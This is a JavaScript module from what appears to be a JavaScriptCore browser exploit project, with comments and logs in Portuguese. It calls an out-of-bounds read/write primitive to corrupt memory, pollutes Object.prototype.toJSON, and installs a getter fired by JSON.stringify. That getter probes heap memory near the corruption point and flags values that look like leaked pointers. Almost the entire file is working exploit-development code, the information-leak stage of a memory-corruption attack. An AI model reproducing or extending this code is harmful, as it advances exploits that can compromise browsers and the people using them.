// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForHeapSnoop";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, snoop_data: [] };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Offsets para sondar ao redor do ponto de corrupção, relativos ao início do oob_array_buffer_real
const SNOOP_WINDOW_START_OFFSET = CORRUPTION_OFFSET - 16; // Sondar 16 bytes antes
const SNOOP_WINDOW_END_OFFSET = CORRUPTION_OFFSET + 16;   // Sondar 16 bytes depois (incluindo a corrupção)

class CheckpointObjectForSnoop {
    constructor(id) {
        this.id = `SnoopCheckpoint-${id}`;
    }
}

export function toJSON_TriggerSnoopGetter() {
    const FNAME_toJSON = "toJSON_TriggerSnoopGetter";
    if (this instanceof CheckpointObjectForSnoop) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeHeapSnoopInGetter"; // Nome interno
    logS3(`--- Iniciando Teste de Sondagem de Heap no Getter ao Redor de ${toHex(CORRUPTION_OFFSET)} ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, snoop_data: [] };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_read_absolute || !oob_write_absolute) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB ou primitivas R/W.", error: "OOB env/primitives not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // Opcional: Limpar/preencher a janela de sondagem com um padrão antes da escrita OOB gatilho
        // for (let i = SNOOP_WINDOW_START_OFFSET; i < SNOOP_WINDOW_END_OFFSET; i += 4) {
        //     if (i >= 0 && (i + 4) <= oob_array_buffer_real.byteLength) {
        //         oob_write_absolute(i, 0xDEADBEEF, 4);
        //     }
        // }
        // logS3("Janela de sondagem preenchida com DEADBEEF (opcional).", "info", FNAME_TEST);


        // 1. Realizar a escrita OOB "gatilho"
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} com ${CORRUPTION_VALUE.toString(true)} completada.`, "info", FNAME_TEST);

        // 2. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForSnoop(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForSnoop.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForSnoop.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() { // Getter SÍNCRONO
                getter_called_flag = true;
                const FNAME_GETTER = "HeapSnoop_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Sondando memória ao redor de ${toHex(CORRUPTION_OFFSET)}...`, "vuln", FNAME_GETTER);
                
                let snoop_results_temp = [];
                let potential_leak_found = false;

                try {
                    if (!oob_read_absolute) {
                        logS3("DENTRO DO GETTER: oob_read_absolute não está disponível!", "critical", FNAME_GETTER);
                        current_test_results = { success: false, message: "oob_read_absolute indisponível no getter.", error: "No oob_read_absolute", snoop_data: [] };
                        return 0xDEADDEAD;
                    }

                    logS3(`DENTRO DO GETTER: Sondando de ${toHex(SNOOP_WINDOW_START_OFFSET)} a ${toHex(SNOOP_WINDOW_END_OFFSET)} (offsets relativos ao oob_ab_data)...`, "info", FNAME_GETTER);
                    
                    for (let offset = SNOOP_WINDOW_START_OFFSET; offset < SNOOP_WINDOW_END_OFFSET; offset += 8) { // Ler de 8 em 8 bytes (AdvancedInt64)
                        if (offset < 0 || (offset + 8) > oob_array_buffer_real.byteLength) {
                            logS3(`Skipping offset ${toHex(offset)} (fora dos limites do buffer)`, "warn", FNAME_GETTER);
                            continue;
                        }
                        try {
                            const value_read = oob_read_absolute(offset, 8); // Ler 8 bytes
                            const value_str = value_read instanceof AdvancedInt64 ? value_read.toString(true) : toHex(value_read, 64);
                            snoop_results_temp.push({offset: toHex(offset), value: value_str});
                            logS3(`SNOOP: oob_data[${toHex(offset)}] = ${value_str}`, "leak", FNAME_GETTER);

                            // Heurística simples para um ponteiro de heap (pode precisar de ajuste)
                            // Ex: Se for um valor grande, não FF..FF, não 0, não pequeno.
                            if (value_read instanceof AdvancedInt64) {
                                if (!value_read.equals(CORRUPTION_VALUE) &&
                                    !value_read.equals(AdvancedInt64.Zero) &&
                                    value_read.high() !== 0xFFFFFFFF && // Não é parte da nossa escrita de FF
                                    value_read.high() !== 0x00000000 && // Não é um ponteiro nulo ou pequeno (pode ser ajustado)
                                    (value_read.high() > 0x00010000 || value_read.high() < 0)) { // Suposição de intervalo de ponteiro (muito genérico)
                                    logS3(`DENTRO DO GETTER: VALOR SUSPEITO (possível ponteiro?) em ${toHex(offset)}: ${value_str}`, "vuln", FNAME_GETTER);
                                    potential_leak_found = true;
                                }
                            }
                        } catch (e_read) {
                            logS3(`SNOOP: Erro ao ler oob_data[${toHex(offset)}]: ${e_read.message}`, "error", FNAME_GETTER);
                            snoop_results_temp.push({offset: toHex(offset), value: `ERRO_LEITURA: ${e_read.message}`});
                        }
                    }
                    current_test_results.snoop_data = snoop_results_temp;
                    if (potential_leak_found) {
                        current_test_results.success = true;
                        current_test_results.message = "Sondagem de heap encontrou valor(es) suspeito(s) perto do offset de corrupção.";
                    } else {
                        current_test_results.message = "Sondagem de heap completada, nenhum vazamento óbvio de ponteiro encontrado na vizinhança imediata.";
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO GERAL durante sondagem de heap: ${e.message}`, "error", FNAME_GETTER);
                    current_test_results.error = String(e);
                    current_test_results.message = `Erro geral na sondagem: ${e.message}`;
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerSnoopGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), snoop_data: [] };
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { delete Object.prototype[ppKey_val]; if(originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc); }
        if (getterPollutionApplied && CheckpointObjectForSnoop.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForSnoop.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForSnoop.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO SONDAGEM HEAP: ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO SONDAGEM HEAP: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        logS3("Dados Sondados (Offset: Valor):", "info", FNAME_TEST);
        current_test_results.snoop_data.forEach(item => {
            logS3(`  ${item.offset}: ${item.value}`, "info", FNAME_TEST);
        });
    } else {
        logS3("RESULTADO SONDAGEM HEAP: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    // logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST); // Pode ser muito verboso

    clearOOBEnvironment();
    logS3(`--- Teste de Sondagem de Heap no Getter Concluído ---`, "test", FNAME_TEST);
}
